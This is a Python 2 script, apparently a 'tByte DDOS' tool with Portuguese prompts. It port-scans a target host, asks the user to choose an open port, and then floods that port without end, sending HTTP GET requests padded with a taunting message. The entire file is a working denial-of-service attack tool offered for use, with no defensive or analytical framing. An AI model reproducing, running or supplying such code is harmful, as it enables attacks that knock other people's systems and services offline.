#!/usr/bin/env python
import socket
import time
import sys
from threading import *
from optparse import OptionParser

class cores:
	W  = '\033[0m'  # branco (normal)
	R  = '\033[31m' # vermelho
	G  = '\033[32m' # verde
	O  = '\033[33m' # laranja
	B  = '\033[34m' # azul
	P  = '\033[35m' # roxo
	C  = '\033[36m' # azul_claro
	GR = '\033[37m' # cinza
	T  = '\033[93m' # laranja_claro

MAX_THREADS = 50
MAX_PORT=1500
CON_TIMEOUT = 0.05
screenLock = Semaphore(value=1)
SEND_MESSAGE = "#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT...#I WILL TAKE YOU DOWN NO MATTER WHAT..."

socket.setdefaulttimeout(CON_TIMEOUT)
class prog:
	def __init__(self):
		self.portas = []
		self.percent = 0
		self.con_ini = 0
		self.attack_port = 0
		self.attack_ip = ''

	def run(self):
		cor = cores()
		parser = OptionParser(cor.R+'t'+cor.G+'Byte'+cor.W+' DDOS - Usage: ./ddos.py -t <target> -p <port>')
		parser.add_option('-t', '--target', dest='target',
							help='Choose target to attack', metavar='target')
		parser.add_option('-p', '--port', dest='port',
							help='Choose a port to attack', metavar='port')

		return parser

	def portScan(self, ip):
		for port in range(0, MAX_PORT):
			self.con_ini+=1
			self.percent = ((self.con_ini*100)/MAX_PORT)
			try:
				socket.socket().connect((ip, port))
				self.portas.append(port)
			except:pass

			sys.stdout.write('Buscando buracos: '+str(self.percent)+'%\r')
			sys.stdout.flush()
			time.sleep(0.0001)
			

	
	def search_ports(self, ip):
		t = Thread(target=self.portScan, args=(ip,))
		t.start()
		t.join()

		sys.stdout.write('\n')
		sys.stdout.flush()
		self.attack_ip = ip

		return self.portas

	def display_options(self):
		cor = cores()
		a = 0
		print 'ID 	PORTA'
		for i in self.portas:
			print '%d 	(%d)'%(a,i)
			a+=1

		opt = raw_input('Escolha a porta: ')
		print 'Voce escolheu a porta (%s), preparando o ataque.' %opt
		self.attack_port = opt
		print '{ '+cor.R+'t'+cor.G+'Byte'+cor.W+' } - '+cor.O+'CAI CAI, BALAO'+cor.W+'...'
		while(True):
			t = Thread(target=self.config_attack, args=(1,))
			t.start()
			t.join()
			time.sleep(0.0001)


	def config_attack(self, ip):
		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			ddos.connect((self.attack_ip, int(self.attack_port)))
			ddos.send("GET /%s HTTP/1.1\r\n" % SEND_MESSAGE)
			ddos.sendto("GET /%s HTTP/1.1\r\n" % SEND_MESSAGE, (self.attack_ip, int(self.attack_port)))
			ddos.send("GET /%s HTTP/1.1\r\n" % SEND_MESSAGE)
			sys.stdout.write('|')
			sys.stdout.flush()
		except socket.error, msg:
			sys.stdout.write('*')
			sys.stdout.flush()
			pass

def main():
	core = prog()
	cor = cores()
	parser = core.run()
	(options, args) = parser.parse_args()
	
	if (options.target == None) | (len(str(options.target)) <= 0):
		print parser.usage
		exit(0)
	else:
		print cor.R+'t'+cor.G+'Byte '+cor.W+'- Buscando portas para Atacar...'
		ip = options.target
		core.search_ports(ip)
		core.display_options()
		


if __name__ == '__main__':
	main()